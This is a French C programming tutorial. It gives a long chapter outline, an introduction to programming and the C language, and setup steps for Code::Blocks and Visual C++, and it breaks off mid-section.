L'en-tête Les bibliothèques Les bibliothèques en informatique Lier une bibliothèque Découvrir Une macro utile Sinus, cosinus et tangente Mesurer un angle Logarithmes Exponentielle Puissances Racine carrée Fonctions d'arrondis Autres fonctions sur les flottants TP : Recodons des fonctions mathématiques Racine carrée Exponentielle Autres La gestion d'erreur Détection des erreurs Valeurs de retour Scanf Main Les autres fonctions Variable globale errno Prévenir l'utilisateur Un exemple d'utilisation des valeurs de retour Les agrégats Les pointeurs C'est quoi ? Utilité Créations de structures de données Allocation dynamique Passage de données complexes en argument de fonctions La RAM Pointeurs Utilisation Déclaration Un pointeur particulier Référencement Initialisation et pointeur nul Initialisation avec une adresse valide Pointeur NULL Déréférencement Des pointeurs comme arguments dans des fonctions Exercice Énoncés Correction Structures Déclaration, définition et initialisation Définition Exemple Déclaration Initialisation typedef Utilisation et pointeurs Accès à un membre Modification d'un membre Pointeurs sur structures Accès via un pointeur Syntaxe alternative Exercice Un peu de mémoire Représentation en mémoire sizeof Alignement en mémoire Mots Alignement Accès mémoires non-alignés Padding Économies Compléments Structures contenant des structures Déclarations anticipées et pointeurs de structures Les tableaux C'est quoi un tableau ? Leur utilité Déclaration et initialisation Déclaration Exemples Macroconstante Initialisation Initialisation avec longueur explicite Initialisation avec longueur implicite Accès aux éléments Calcul d'adresse Adresse du premier élément Arithmétique des pointeurs Formalisme tableaux Le cas des structures Débordement de tableaux Exemple Tableaux et fonctions Passer un tableau en paramètre de fonction Une histoire de copie Retourner un tableau Exercices Somme Maximum et minimum Recherche d'un élément dans un tableau Inverser les éléments d'un tableau Les tableaux multidimensionnels Déclaration et initialisation Déclaration Exemples Initialisation Avec la taille de la première dimension Sans la taille de la première dimension Accès à un élèment Row Major Order Calcul d'adresse Débordements chaotiques Envoi à une fonction Formalisme pointeur Formalisme tableau Exercices Somme, produit, moyenne Somme des éléments d'un tableau Moyenne des éléments Produit des lignes Minimum et maximum Triangle de Pascal Les chaînes de caractères Qu'est ce qu'une chaîne de caractères ? Pascal Strings Null Terminated Strings Déclaration et initilisation Première méthode Initialisation sans la taille Initialisation avec la taille Une autre manière de faire Constantes chaînes Affectation Lire et écrire dans une chaîne Printf et scanf Chaînes et scanf Chaîne de caractères trop longue Chaîne de caractères avec des espaces Une histoire de vidange Autres fonctions de stdio.h sprintf() - Écrire dans une chaîne sscanf() - Lire dans une chaîne Conversion de chaînes de caractères en nombres strtol - Convertir une chaîne en long Paramètres stroul strtod - Convertir une chaîne en double L'en-tête Longueur Résultat Argument Prototype Exemple Copie strcpy - Copier une chaîne Prototype Débordements chaotiques strncpy - Copie partielle d'une chaîne Prototype Arguments Conséquences imprévues Comparaisons strcmp - Comparer deux chaînes Argument Valeur de retour Prototype Exemple strncmp - Comparer deux chaînes partiellement Valeur de retour Arguments Prototype Exemple Recherche strchr - Rechercher un caractère Valeur de retour Paramètres Prototype Exemple Remarque strrchr - La cousine de strchr strpbrk - Rechercher une liste de caractères Valeur de retour Prototype Paramètres Exemple strstr - Rechercher une chaîne dans une autre Valeur de retour Paramètres Prototype Exemple Autres strcat - Concaténer deux chaînes Prototype Exemple Attention ! strncat - Concaténer partiellement Prototype Exemple Attention bis Exercices Palindromes Énoncé Correction Changeons de registre, jouons au validateur Votre mission Un indice ? Correction ! Recodons la bibliothèque standard Correction L'allocation dynamique Durée de vie Automatique Statique Initialisation automatique Exemple Dynamique Malloc et consoeurs Schéma à suivre malloc - Allouer de la mémoire Arguments sizeof Retour de malloc Exemple free - Libérer un espace alloué dynamiquement Argument calloc - Allocation et mise à zéro Arguments Retour realloc - Réallouer à volonté Arguments Retour Précisions Les entrées-sorties Les flux Un peu de théorie Préambule En langage C Ouverture et fermeture de flux fopen - Ouverture d'un flux Explication Application fclose - Fermer un fichier Ouvrir plusieurs fichiers à la fois Lecture d'un flux fgetc - Lecture d'un caractère fgets - Lecture d'une chaîne de caractères La grande famille de scanf Écriture dans un flux fputc - Écriture d'un caractère fputs - Ecriture d'une chaîne de caractères La grande famille de printf D'autres fonctions Manipuler le curseur ftell - Déterminer la position du curseur fseek - Repositionner le curseur rewind - Repositionner le curseur au début Opérations diverses rename - Renommer un fichier remove - Supprimer un fichier Entrées sécurisées Les dangers de scanf Chaîne de caractères avec des espaces Chaîne de caractères trop longue Entrée erronée Des alternatives Récupérer une chaîne Une fonction de saisie Vider un buffer Notre fonction de saisie Récupérer une valeur Comment bien utiliser scanf ? Limiter le nombre de caractères lus Les regexs T.P - zAnalyse Énoncé zAnalyse Niveau facile Niveau intermédiaire Niveau difficile Pour aller plus loin Opérations bit à bit et champs binaires Les opérateurs bitwise Les opérateurs appliqués en C Les opérateurs de décalage Bit de poids fort / faible Décalage à droite Décalage à gauche Exercice : afficher la représentation base 2 d'un entier Le masquage et les champs de bits Les masques Mettre un bit à 1 Mettre un bit à 0 Se fabriquer un masque plus facilement Les champs de bits Quelques astuces Gestion des flags Puissances de 2 Obtenir la valeur maximum d'un type non-signé Enumérations et unions Les énumérations Les bases Les énumérations face au préprocesseur Les énumérations anonymes Les unions Exemple pratique : une abstraction pour les chaînes de caractères Découvrir le C99 / C11 Avant de démarrer Découvrir le C99 Les commentaires mono-lignes Le mot-clef long long Les booléens Les nombres complexes Le mot-clef inline Le mot-clef restrict Mélange déclaration / code Les VLA Les limitations de ce mécanisme Tableau incomplet dans une structure La variable __func__ Les nombres flottants Découvrir le C11 La suppression de gets Les structures et les unions anonymes Une nouvelle interface pour fopen Les macros génériques Le mot-clef _Noreturn Améliorations des complexes Des bibliothèques par milliers Le reste de la bibliothèque standard <assert.h> - Intercepter les erreurs de programmation <ctype.h> - Test sur les caractères <limits.h> - Connaître les limites des types entiers <float.h> - Limites des flottants et de ce qui les concerne <stddef.h> - Définition d'alias <stdint.h> - Définitions d'entiers spéciaux et leurs limites (C99) Les bibliothèques tierces Les bibliothèques pour 2D SDL - Simple DirectMedia Layer SFML - Simple and Fast Multimedia Library Les bibliothèques pour la 3D OpenGL - Open Graphics Library DirectX Les bibliothèques pour le son Bibliothèques pour faire des applications graphiques API Windows Xlib Gtk+ Autres bibliothèques GMP Remerciements Introduction Cette première partie sera l'occasion de se familiariser avec les concepts de base de la programmation et du C et de pouvoir commencer à pratiquer en écrivant quelques programmes. Lisez-la bien attentivement, même si vos avez déjà une expérience en programmation, car il est impossible de bien programmer en C si les bases ne sont pas solides. Introduction à la programmation La programmation est un sujet qui fascine énormément. Si vous lisez ce cours, c'est que vous avez décidé de franchir le pas et de découvrir ce que c'est que programmer. Avant de commencer à apprendre quoi que ce soit sur le C et la programmation, il faudrait néanmoins se demander en quoi la programmation consiste. En effet, savez-vous réellement ce que c'est, comment programmer ou encore ce qui caractérise ce fameux langage C ? Ces questions importantes et légitimes méritent des réponses. Ce chapitre va donc faire une introduction au monde de la programmation, et plus particulièrement au langage C. Avant-propos Esprit et but du tutoriel Ce tutoriel a été écrit dans un seul but : vous enseigner le langage C de la manière la plus complète, la plus rigoureuse et la plus instructive possible. Pour ce faire, le tutoriel combinera beaucoup de théorie, de connaissances importantes, de détails et de recherches en profondeur avec de la pratique par des exemples concrets, des exercices pratiques et des TP. Cette approche va réclamer de votre part des efforts puisque le tutoriel semblera parfois complexe. Nous avons choisi cette méthode d'apprentissage, car c'est celle que nous jugeons la plus payante. Elle s'oppose à une plus rapide, qui permet certes d'acquérir des connaissances rapidement, mais qui s'avère bien souvent peu payante sur le long terme, beaucoup de programmeurs débutants étant ainsi perdus lorsqu'ils sont jetés dans la jungle de la programmation à la sortie d'un cours, n'ayant pas acquis de bonnes pratiques et de la rigueur. Nous allons donc essayer de vous enseigner non seulement un langage, mais aussi de bonnes pratiques et de la rigueur. En résumé, ce tutoriel fera un juste mélange entre théorie, détails et recherches avec de la pratique et des exemples. À qui est destiné ce tutoriel ? Le tutoriel a pour but d'être accessible à n'importe qui. Que vous soyez un programmeur expérimenté, un total débutant ou que vous vouliez réviser certaines notions du C, vous êtes le bienvenu dans ce tutoriel. Les explications seront les plus claires possible afin de rendre la lecture accessible à tous. Cependant, il y a quelques conditions. Même si nous avons conçu le tutoriel pour être clairs, il vous faut plusieurs qualités pour arriver à tenir jusqu'au bout. De la motivation : ce tutoriel va présenter de nombreuses notions, souvent très théoriques, et qui sembleront parfois complexes. Il vous faut donc être bien motivés pour profiter pleinement de cet apprentissage. De la logique : apprendre la programmation, c'est aussi être logique. Bien sûr, ce tutoriel vous apprendra à mieux l'être, mais il faut néanmoins savoir réfléchir par soi-même et ne pas compter sur les autres (tutoriels ou forums) pour faire le travail à sa place. De la patience : vous vous apprêtez à apprendre un langage de programmation. Pour arriver à un sentiment de maitrise, il va falloir de la patience pour apprendre, comprendre, s'entrainer, faire des erreurs et les corriger. De la rigueur : cette qualité, nous allons tenter de vous l'inculquer à travers ce cours. Elle est très importante, car c'est elle qui fera la différence entre un bon et un mauvais programmeur. De la passion : le plus important pour suivre ce tutoriel, c'est de prendre plaisir à programmer. Amusez-vous en codant, c'est le meilleur moyen de progresser ! Je tiens aussi à préciser qu'un niveau acceptable en anglais est très fortement recommandé. En effet, beaucoup de cours, de forums, de documentations et autres seront en anglais. Tôt ou tard, vous serez confronté à l'anglais, il faut vous y préparer. Si vous êtes encore étudiant, cela ne vous sera que bénéfique ! Si vraiment l'anglais n'est vraiment pas votre fort, vous pouvez utiliser un dictionnaire pour vous aider. Dernier point qui concerne les mathématiques : contrairement à la croyance populaire, un bon niveau en maths n'est absolument pas nécessaire pour faire de la programmation. Certes, ça peut aider en développant la logique, mais si les mathématiques ne sont pas votre fort, vous pourrez quand même suivre ce cours sans problèmes. Allez plus loin Un des concepts fondamentaux de l'apprentissage de notions informatiques sur Internet est le croisement des sources . Il permet de voir la programmation sous un angle différent. Par exemple, quelques cours de Developpez d'approches différentes sont à votre entière disposition. N'hésitez pas non plus à lire des livres sur le C, notamment le K&R , écrit par les auteurs du C (une version traduite en français est disponible aux éditions Dunod ). C'est un livre très complet qui pourra vous être utile. Enfin le plus important : n'hésitez pas à programmer tout seul. Faites des exercices, modifiez les codes du tutoriel, regardez ceux des autres, participez à des projets. C'est la meilleure façon de progresser. La programmation, qu'est-ce que c'est ? La programmation est une branche de l'informatique qui sert à créer des programmes . Tout ce que vous possédez sur votre ordinateur sont des programmes : votre navigateur Internet (Internet Explorer, Firefox, Opera, etc.), votre système d'exploitation (Windows, GNU/Linux, etc.) qui est un regroupement de plusieurs programmes appelé logiciel , votre lecteur MP3, votre logiciel de discussion instantanée, vos jeux vidéos, etc. Les programmes expliqués en long, en large et en travers Un programme est une séquence d' instructions , d'ordres, donnés à l'ordinateur afin qu'il exécute des actions. Ces instructions sont généralement assez basiques. On trouve ainsi des instructions d'addition, de multiplication, ou d'autres opérations mathématiques de base, qui font que notre ordinateur est une vraie machine à calculer. D'autres instructions plus complexes peuvent exister, comme des opérations permettant de comparer des valeurs, traiter des caractères, etc. Créer un programme, c'est tout simplement créer une suite d'instructions de base qui permettra de faire ce que l'on veut. Tous les programmes sont créés ainsi : votre lecteur MP3 donne des instructions à l'ordinateur pour écouter de la musique, le chat donne des instructions pour discuter avec d'autres gens sur le réseau, le système d'exploitation donne des instructions pour dire à l'ordinateur comment utiliser le matériel et comment fonctionner, etc. Petite remarque : on ne peut pas créer d'instructions. Notre ordinateur est conçu, câblé, et peut traiter certaines instructions de bases, précâblées dans ses circuits, sans possibilité d'en inventer d'autres (sauf cas particulier vraiment tordus). Notre ordinateur contient un composant électronique particulier, spécialement conçu pour effectuer ces instructions : il s'agit du processeur . Ce qu'il faut retenir, c'est que notre ordinateur contient un circuit, le processeur, qui permet d'effectuer de petits traitements de base qu'on appelle instructions et qui sont la base de tout ce qu'on trouve sur un ordinateur. Pour les curieux, il existe un cours sur le fonctionnement d'un ordinateur expliqué depuis zéro. Ces instructions sont stockées dans notre ordinateur sous la forme de bits, de petites données qui valent soit 0, soit 1. Ainsi, nos instructions ne sont rien d'autre que des suites de 0 et de 1, stockées dans notre ordinateur, et que notre processeur va interpréter comme étant des ordres à effectuer. Ces suites de zéros et un sont difficilement compréhensibles pour nous humains, et parler à l'ordinateur avec des 0 et des 1 est très dur et très long. Autant vous dire que créer des programmes de cette façon revient à se tirer une balle dans le pied. Pour vous donner un exemple, imaginez que vous devez communiquer avec un étranger alors que vous ne connaissez pas sa langue. Communiquer avec un ordinateur reviendrait à devoir lui donner une suite de 0 et de 1 : ça risque de prendre énormément de temps et cela serait difficile. Tout se passe comme si votre processeur parlait un langage particulier, composé de suite de zéro et d'un bien organisé, et qu'il était incapable de parler autre chose. Le langage du processeur s'appelle le langage machine . Une question doit vous venir à l'esprit : comment communiquer avec notre processeur sans avoir à apprendre sa langue ? L'idéal serait de parler à notre processeur en français, en anglais, etc. Mais disons-le clairement : notre technologie n'est pas suffisamment évoluée, et nous avons dû trouver autre chose. La solution retenue a été de créer des langages de programmation plus évolués que le langage du processeur, plus faciles à apprendre, et de fournir le traducteur qui va avec. Ces langages de programmation plus évolués sont des sortes de langages assez simplifiés, assez proches des langages naturels, et dans lesquels on peut écrire nos programmes beaucoup plus simplement qu'en utilisant le langage machine. Grâce à eux, on peut écrire nos programmes sous forme de texte, sans avoir à se débrouiller avec des suites de 0 et de 1 totalement incompréhensibles. Il existe de nombreux langages de programmation, et le C est un de ces langages. Reste que notre processeur ne comprend pas ces langages évolués ; il ne comprend qu'un seul langage, le sien. Pour utiliser nos langages de programmation, il faut aussi avoir une sorte de traducteur qui fera le lien entre votre langage de programmation et le langage machine du processeur. Ce traducteur va ainsi traduire du texte (écrit dans un langage de programmation évolué) en une suite de zéro et d'un que le processeur peut comprendre. Ainsi vous pourrez commander votre processeur même si vous ne parlez pas sa langue. Pour illustrer, ce code écrit en C (que nous apprendrons à connaître) est quand même largement plus facile à comprendre qu'une suite de 0 et de 1. #include <stdio.h> int main ( void ) { printf ( \"Salut !\" ); return 0 ; } Imaginez la même chose composée de 0 et de 1, et vous comprendrez tout l'intérêt d'un langage de programmation. Il ne reste plus qu'à utiliser un interprète qui va traduire ce texte (un programme écrit dans notre langage de programmation) vers la langue de l'ordinateur (des suites de 0 et de 1) : le compilateur . Voici un petit schéma qui résume tout ça : Le langage C Malgré tous ces langages de programmation disponibles, nous allons dans ce tutoriel nous concentrer sur un seul langage : le langage C. Avant de parler des caractéristiques de ce langage et des choix qui nous amènent à l'étudier dans ce cours, faisons un peu d'histoire. L'histoire du C Le langage C est né au début des années 1970 dans les laboratoires AT&T aux États-Unis. Son concepteur, Dennis Ritchie , souhaitait améliorer un langage existant, le B, afin de lui adjoindre des nouveautés. En 1973, le C était pratiquement au point, et il commença à être distribué l'année suivante. Son succès était tel auprès des informaticiens que l' ANSI en 1989, puis l' ISO en 1990 décidèrent de le normaliser, c'est-à-dire d'établir les règles officielles du langage. On parle donc de C89 / C ANSI ou bien C90 / C ISO (au choix). D'autres normes sortirent plus tard, en 1999 (on parle de C99) et en 2011 (on parle de C11). Si vous voulez en savoir plus sur l'histoire du C, lisez donc ce tutoriel . Pourquoi apprendre le C ? C'est une très bonne question. Après tout, il existe tellement de langages différents, et on peut logiquement se demander pourquoi le C en particulier ? Il y a plusieurs raisons à ça. Sa popularité : il fait partie des langages de programmation les plus utilisés. Il possède une communauté très importante et de nombreux tutoriels et documentations. Vous aurez donc toujours du monde pour vous aider. De plus, il existe beaucoup de programmes et de bibliothèques développés en et pour le C. Sa rapidité : le C est connu pour être un langage très rapide, ce qui en fait un langage de choix pour tout programme où la vitesse est cruciale. Sa légèreté : le C est léger, ce qui le rend utile pour les programmes embarqués où la mémoire disponible est faible. Sa portabilité : cela veut dire qu'un programme développé en C marche théoriquement sur n'importe quelle plateforme. Il faut savoir que le C a été conçu pour la programmation système (drivers, systèmes d'exploitation, matériel embarqué, etc). Or, les plate-formes étant différents, il était difficile à l'époque d'avoir un code générique pouvant marcher sur n'importe quel environnement. La volonté des créateurs du C était donc de faire un langage permettant de produire du code portable. Ce ne sont que quelques raisons, mais elles sont à mon gout suffisantes pour apprendre ce langage. Bien entendu, le C comporte aussi sa part de défauts. On peut citer la tolérance aux comportements dangereux qui fait que le C demande beaucoup de rigueur pour ne pas tomber dans certains « pièges », un nombre plus restreint de concepts (c'est parfois un désavantage, car on est alors obligé de recoder certains mécanismes qui existent nativement dans d'autres langages), etc. D'ailleurs, si votre but est de développer rapidement des programmes amusants, le C n'est pas du tout adapté pour ça, et je vous encourage à vous tourner vers d'autres langages comme le Python par exemple. Le C possède aussi une caractéristique qui est à la fois un avantage et un défaut : c'est un langage plutôt de bas niveau . Cela veut dire qu'il permet de programmer en étant proche de sa machine, en cherchant à vraiment comprendre ce que l'on fait. C'est à double tranchant : c'est plus difficile et plus long, mais on en apprend beaucoup sur sa machine et on a un grand contrôle de ce que l'on fait. Cette notion de bas niveau est d'ailleurs à opposer aux langages de haut niveau , qui permettent de programmer en faisant abstraction d'un certain nombre de choses. Le développement est souvent plus facile et plus rapide, mais en contrepartie on voit moins bien le fonctionnement de la machine. Ces notions de haut et bas niveau sont néanmoins à nuancer, car elles dépendent du langage utilisé et du point de vue du programmeur. Je termine cette partie en rajoutant quelque chose. Peut-être avez-vous entendu parler du C++. C'est un langage de programmation qui a été inventé dans les années 1980 par Bjarne Stroustrup, un collègue de Dennis Ritchie, qui souhaitait rajouter des éléments au C. Bien que très ressemblants à l'époque de sa création, ces deux langages sont aujourd'hui très différents (on ne programme pas et on ne réfléchit pas de la même façon en C qu'en C++). Ne croyez pas qu'il y a un langage meilleur que l'autre. Ils sont simplement différents. Si d'ailleurs votre but est d'apprendre le C++, je vous encourage à le faire. Contrairement à ce que l'on pense et dit souvent, il n'y a pas besoin de connaitre le C pour ça. Ce tutoriel ne se concentrera quant à lui que sur ce dernier. La norme Comme précisé plus haut, le C est un langage qui possède des règles. Ces règles ont été définies par des informaticiens professionnels et sont toutes regroupées dans ce que l'on appelle la norme du langage. Cette norme sert de référence à tous les programmeurs. Chaque fois que l'on a un doute ou que l'on se pose une question, le premier réflexe est de regarder dans la norme ce qui est dit. Bien entendu, la norme n'est pas parfaite et ne répond pas à toutes les questions, et ne précise pas tous les détails. Néanmoins, elle reste la référence du programmeur. Cette norme sert aussi de référence pour les compilateurs. En effet, tous les compilateurs respectent cette norme (en règle générale), ce qui fait qu'il n'y aura pas différentes interprétations d'un même code. Cette norme est l'équivalent des règles d'orthographe, de grammaire et de conjugaison de nos interprètes. Imaginez si chacun écrivait ou conjuguait à sa guise tout ce qu'il veut. La norme sert donc à officialiser tout un tas de règles pour que tous les interprètes (et donc les compilateurs) la suivent. Il existe plusieurs versions de la norme : le C89, le C99 et le C11. Dans ce cours, nous avons décidé de nous servir de la norme C89. En effet, même si c'est la plus ancienne et qu'elle semble restrictive à certains, elle permet néanmoins de développer avec n'importe quel compilateur sans problèmes, contrairement aux normes C99 et C11 que tous les compilateurs ne connaissent pas. De plus, il est très facile de passer aux normes plus récentes ensuite. Voici le lien vers le brouillon de cette norme. Cela signifie que ce n'est pas la version définitive et officielle de la norme, celle-ci est très chère à obtenir, alors que le brouillon est largement suffisant pour notre niveau et gratuit. Bien entendu, cette norme est en anglais. L'algorithmique L'algorithmique est très liée à la programmation, et elle constitue même une branche à part des mathématiques. Elle consiste à définir et établir des algorithmes. Un algorithme peut se définir comme étant une suite finie et non-ambiguë d'opérations permettant de résoudre un problème. En clair, il s'agit de calculs qui prennent plusieurs paramètres et fournissent un résultat. Les algorithmes ne sont pas limités à l'informatique, ils existaient même avant son apparition ; prenez les recettes de cuisine par exemple, ou des instructions de montage d'un meuble ou d'un Lego : ce sont des algorithmes. L'intérêt principal des algorithmes est qu'ils sont très utiles lorsqu'ils sont en relation avec des ordinateurs. En effet, ces derniers peuvent exécuter des milliards d'instructions à la seconde, ce qui les rend bien plus rapides qu'un humain. Illustrons : imaginez que vous deviez trier une liste de 10 nombres dans l'ordre croissant. C'est assez facile et faisable en quelques secondes. Et pour plusieurs milliards de nombres ? C'est impossible pour un humain, alors qu'un ordinateur le fera rapidement. Ce qu'il faut retenir, c'est qu'un algorithme est une suite d'opérations destinée à résoudre un problème donné. Nous aurons l'occasion d'utiliser quelques algorithmes dans ce cours, mais nous ne nous concentrerons pas dessus. Si vous voulez en savoir plus, lisez le tutoriel sur l'algorithmique pour l'apprenti programmeur en même temps que vous apprenez à programmer avec celui-ci. Le pseudo-code Pour représenter un algorithme indépendamment de tout langage, on utilise ce qu'on appelle un pseudo-code . Il s'agit de la description des étapes de l'algorithme en langage naturel (dans notre cas le français). Voici un exemple de pseudo-code : Fonction max (x, y) Si x est supérieur à y Retourner x Sinon Retourner y Fin fonction Dans ce cours, il y aura plusieurs exercices dans lesquels un algorithme fourni devra être implémenté (traduit) en C. Si vous voulez vous entrainer davantage tout en suivant ce cours, je vous conseille France-IOI qui permet d'implémenter divers algorithmes en plusieurs langages dont le C. Cela pourra être un excellent complément. Comme vous avez pu le constater, la programmation est un monde vaste, très vaste, et assez complexe. Comme il existe une multitude de langages de programmation, il faut se concentrer sur un seul d'entre eux à la fois. Dans notre cas, il s'agit du C. Ce langage, et retenez-le bien, est à la fois très puissant et complexe. Souvenez-vous bien qu'il vous faudra faire des efforts pour l'apprendre correctement. Si vous vous sentez prêts, alors rendez-vous dans le chapitre suivant, qui vous montrera les outils utilisés par un programmeur en C. Outils Maintenant que les présentations sont faites, il est temps de découvrir les outils nécessaires pour programmer en C. Le strict minimum pour programmer se résume en trois points. Un éditeur de texte : ce logiciel va servir à écrire le code source. En théorie, n'importe quel éditeur de texte suffit, mais le mieux est d'en avoir qui colore le code source, ce qui permet une relecture plus agréable. Un compilateur : c'est le logiciel le plus important puisqu'il va nous permettre de transformer le code que l'on écrit en un fichier exécutable compréhensible par le processeur. Un débugger / débogueur (prononcez « débegueur ») : fondamentalement, il n'est pas indispensable, mais ce logiciel est très utile pour chasser les bugs et vérifier le comportement de son programme. À partir de là, il existe deux moyens de récupérer tous ces logiciels : soit on les prend séparément, et dans ce cas il faut compiler par soi-même, soit on utilise un logiciel qui réunit les trois : un IDE ( EDI en français). Face à la multitude de logiciels différents qui existent, ce chapitre a pour but de vous guider en vous montrant quelques logiciels, que ce soit pour compiler à la main ou avec un IDE . Windows Bien que de nombreux IDE soient disponibles pour Windows, nous ne parlerons que de deux d'entre eux : Code::Blocks et Visual C++, sans oublier une partie consacrée à la compilation ''via'' l'invite de commande. Avec un IDE Code::Blocks Code::Blocks est un IDE gratuit et libre (vous pouvez obtenir le code source du logiciel si vous le souhaitez), qui fonctionne avec plusieurs compilateurs différents et qui n'est pas très compliqué à prendre en main. Il n'est cependant disponible qu'en anglais (bien qu'il existe des traductions incomplètes en français) ; néanmoins, avec un dictionnaire et de l'intuition, vous vous en sortirez très bien. Pour télécharger Code::Blocks, rendez-vous sur le site officiel , dans la section « Downloads », puis dans la sous-section « Download the binary release ». Cette section vous permettra de télécharger le logiciel ; contrairement à la section « Download the source code ' » qui sert à télécharger le code source de Code::Blocks. Il va falloir ensuite télécharger la version du logiciel adaptée à votre système d'exploitation. Windows : choisissez « codeblocks-XX.XXmingw-setup.exe » pour télécharger la version de Code::Blocks pour Windows avec un compilateur intégré. Si vous choisissez la première, vous ne pourrez pas compiler vos programmes ! Je le répète donc encore une fois : choisissez la version avec mingw dans le nom. Pour information, MinGW est une adaptation pour Windows du compilateur GCC . Linux : choisissez la version qui correspond à votre distribution. Attention à ne pas confondre les versions 32 bits et 64 bits. Mac : téléchargez le fichier proposé. Une image pour bien comprendre : Si cependant vous êtes expérimentés et que vous souhaitez installer votre propre compilateur, vous pouvez prendre la première version. Ensuite pour l'installation, laissez-vous guider, elle est très simple. Une fois l'installation terminée, en lançant Code::Blocks, vous devriez obtenir ceci : Cela vous parait compliqué ? Je vais tout vous expliquer dans quelques secondes. Avant, j'aimerais qu'on crée un projet, pour que je puisse vous illustrer tout ça. Pour ce faire, deux possibilités : ou vous cliquez sur « Create a new project » dans le menu de démarrage, ou bien vous cliquez sur « File -> New -> Project ». Dans tous les cas, vous tombez sur cette fenêtre : Choisissez l'icône « Console application », entourée en gras sur l'image. Puis double-cliquez dessus ou cliquez sur le bouton « Go » pour créer un projet de type console. Le premier menu est juste un menu informatif, cliquez sur « Next ». La page suivante vous demande quel langage vous voulez utiliser. Sélectionnez « C » puis « Next ». Vous arrivez ensuite sur cette fenêtre : Là, il y a plusieurs champs. Project title : c'est le nom que vous souhaitez donner à votre projet. Un même nom ne peut pas être utilisé plusieurs fois, il faut un nom différent pour chaque projet. Folder to create project in : c'est le répertoire dans lequel le projet sera créé. Project filename et resulting filename : ces champs sont remplis automatiquement par Code::Blocks, on ne s'en préoccupe pas. Ensuite, dernière fenêtre : Compiler : permet de choisir le compilateur que l'on veut utiliser. Ici, comme il n'y a que ce compilateur d'installé, on n'y touche pas. Create \"Debug\" configuration : cochez cette case pour avoir un exécutable compilé en mode Debug , c'est-à-dire un programme non optimisé qui contiendra toutes les informations nécessaires pour déboguer. L'exécutable ne sera pas portable. Create \"Release configuration''' : le programme est optimisé, portable et allégé puisqu'il ne possède plus les informations de débogage. Choisir entre les deux modes importe peu pour l'instant. Il faut simplement que l'un des deux au moins soit coché. Cliquez sur « Finish » pour terminer la création du projet. Maintenant, vous devez avoir une fenêtre comme celle-ci : Je pense que quelques explications ne seraient pas de refus. C'est la liste des menus . Certains seront très utilisés, tandis que d'autres presque pas. Retenez que le menu « File » est l'un des plus utilisés. Ce sont les icônes . Voici les quatre principales : -> c'est l'icône « Build », qui sert à compiler le fichier sans le lancer ; le raccourci clavier est Ctrl + F9 . -> c'est l'icône « Run », qui lance le dernier exécutable compilé ; le raccourci clavier est Ctrl + F10 . -> c'est l'icône « Build & Run », la contraction des deux icônes précédentes : elle compile et exécute ; le raccourci clavier est F9 . -> c'est l'icône « Rebuild », qui sert à recompiler tous les fichiers ; par défaut, Code::Blocks ne les recompile pas tous (seuls ceux qui ont été modifiés sont recompilés) ; le raccourci clavier est Ctrl + F11 . C'est la zone des projets . C'est ici que vous pouvez voir tous les fichiers qui composent votre projet. Vous pouvez même avoir plusieurs projets en même temps, mais vous ne pouvez en compiler qu'un à la fois. C'est la zone principale , car c'est ici que l'on écrit le code source. C'est la zone de notification où apparaissent les erreurs, les messages de compilation, les messages du débogueur, ainsi que les les avertissements. Vous pouvez voir que Code::Blocks a généré un code par défaut. Nous allons le compiler. Utilisez les icônes ou les raccourcis clavier pour se faire. Il se peut que vous obteniez un message d'erreur comme celui-ci : \"My-program - Release ou Debug\" uses an invalid compiler. Skipping... Nothing to be done. Si cela vous arrive, ne paniquez pas. Il y a deux causes possibles. ​ Vous utilisez Code::Blocks et vous avez téléchargé la version sans compilateur : dans ce cas, retournez sur le site officiel et prenez la version avec MinGW . Vous avez la bonne version et dans ce cas c'est le chemin vers le compilateur MinGW qui est incorrect : rendez-vous dans « Settings -> Compiler&Debugger -> Toolchain executable », cliquez sur « … », et saisissez le répertoire « MinGW » dans votre installation (si vous avez installé Code::Blocks avec MinGW , celui-ci se trouve dans le répertoire de Code::Blocks), puis cliquez sur OK. Une fois le problème réglé (si problème il y avait), le programme est compilé et un message apparait dans la console : Hello world! Process returned 0 (0x0) execution time : x.xxx s Press any key to continue. La première ligne correspond à ce qu'affiche le programme. Les deux lignes suivantes sont elles spécifiques à Code::Blocks. La première indique à l'utilisateur si le programme s'est bien déroulé ou s'il y a eu erreur et le temps écoulé depuis le lancement. La seconde demande d'appuyer sur une touche pour continuer. En effet, sans cette dernière ligne, nous n'aurions pas pu voir le programme se lancer qu'il serait déjà terminé. Ce comportement est spécifique à Windows. Visual C++ Visual C++ est un IDE édité par Microsoft et très efficace, car adapté pour Windows. Il possède aussi un débogueur puissant. Bien qu'il ne soit pas libre, Visual C++ est gratuit (dans sa version express) et disponible en de nombreuses langues, dont le français. Il suffit tout simplement d'enregistrer le logiciel pour l'utiliser sans limites de temps ; c'est gratuit et rapide, vous n'avez besoin que d'une adresse mail. Pour télécharger Visual C++, rendez-vous sur le site de Microsoft . Cliquez ensuite sur l'onglet « Visual C++ 2010 Express ». Vous arriverez sur la page de téléchargement. Sélectionnez la langue que vous voulez puis cliquez sur « Télécharger ». Le programme d'installation va se charger de tout télécharger et tout installer. À un moment, vous devrez redémarrer. Acceptez, et une fois le redémarrage terminé, l'installation finira tranquillement. Voici à quoi ressemble Visual C++ 2010 Express : Comme pour Code::Blocks, j'aimerais vous montrer la création d'un projet avant de vous expliquer l'image. Pour cela, deux possibilités : cliquez sur « Nouveau projet » au démarrage, ou bien « Fichier ->Nouveau -> Projet ». Vous devriez obtenir cette fenêtre : Pour créer un projet en console, sélectionnez « Application console Win32 », et donnez un nom à votre projet dans la case « Nom » en bas de la fenêtre. Une fois ceci fait, vous arrivez sur une fenêtre à propos des paramètres de votre projet. Cliquez sur « Suivant » en bas ou « Paramètres de l'application » dans la colonne à gauche. Vous devez tomber sur une fenêtre comme celle-ci : Sélectionnez « Projet vide » pour commencer avec un projet vierge, sinon Visual va créé un projet avec des fichiers dont nous ne voulons pas. Pour rajouter des fichiers, la manœuvre est très simple : faites un clic droit sur l'onglet « Fichiers sources » dans la colonne de gauche, puis allez dans « Ajouter -> Nouvel élément… ». Une petite image pour bien comprendre : Une nouvelle fenêtre apparait alors pour vous demander quel type de fichier il faut ajouter au projet. Cliquez sur « Fichiers C++ (.cpp) » (même si ce type de fichier est normalement réservé au C++), et appelez votre fichier main.c . Il faut que le fichier se termine par .c , sinon Visual ajoutera automatiquement l'extension .cpp qui est celle des fichiers C++. Donc faites-y attention ! Et si nous examinions un peu les menus de Visual C++ ? Vous devriez normalement avoir une fenêtre comme celle-ci : Regardons plus attentivement ces quatre zones. La barre d'outils : elle contient tous les menus et les raccourcis (comme la compilation, la génération, etc), certains seront plus utilisés que d'autres. La zone principale : 